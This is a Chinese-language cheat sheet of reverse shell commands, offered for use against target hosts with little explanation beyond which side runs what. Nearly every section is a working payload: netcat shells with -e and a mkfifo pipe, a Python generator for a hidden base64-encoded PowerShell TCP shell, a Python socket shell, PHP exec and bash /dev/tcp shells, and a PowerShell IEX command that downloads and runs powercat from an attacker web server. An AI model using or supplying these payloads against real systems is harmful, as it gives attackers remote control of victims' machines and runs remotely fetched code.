# 常用 nc 反弹 shell
## 使用-e 来反弹 shell
服务端：
```bash
nc -nv 10.10.10.1 4444 -e /bin/bash  #linux
```
```bash
nc.exe 10.10.10.1 4444 -e cmd.exe    #windows
```
客户端：
```bash
nc -lvnp 4444   #linux/windows
```
最后在客户端收到 shell，但是有时 linux 默认安装的 nc 可能不具有-e 功能，属于阉割版，这时以上命令不起作用
## 无-e 反弹 shell
服务端：
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 5555 > /tmp/f
```
客户端：
```bash
nc -lvnp 5555
```



# Python 反弹 shell
当目标含有python执行环境后
## windows环境
```python
import sys
import base64
payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
```
最后该脚本输出在powershell中可执行的语句，执行后会反弹shell（其中payload base64加密）


## linux环境
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("47.xxx.xxx.72",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
该命令在linux中的bash执行



# PHP 反弹 shell
## 常用 PHP 反弹 shell
服务端：
```php
<?php exec("bash -c 'bash -i >& /dev/tcp/10.10.10.1/5555 0>&1'");?>
```
客户端：
```bash
nc -lvnp 5555
```
使用 exec（）函数执行 bash 命令，或者使用 system（）命令，主要使用在 linux 系统



# ASP/ASPX 反弹 shell
包含在 kali 中，ASP/ASPX 路径 `/usr/share/webshells/asp`  和 `/usr/share/webshells/aspx`



# Java 反弹 shell
包含在 kali 中，`/usr/share/webshells/jsp`



#  Linux bash 反弹 shell
## 使用 bash 反弹 shell
服务端：
```bash
/bin/bash -c "bash -i >& /dev/tcp/10.10.10.1/5555 0>&1"
```
客户端：
```bash
nc -lvnp 5555
```




# Windows powershell 反弹 shell
## Powercat 反弹 shell
首先开启 http 服务，用于远程主机下载 powercat
`php -S 0:80`
执行 powershell 命令
服务端：
```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.1/powercat.ps1');powercat -c 10.10.10.2 4444 -e cmd
```
客户端：
```bash
nc -lvnp 4444
```



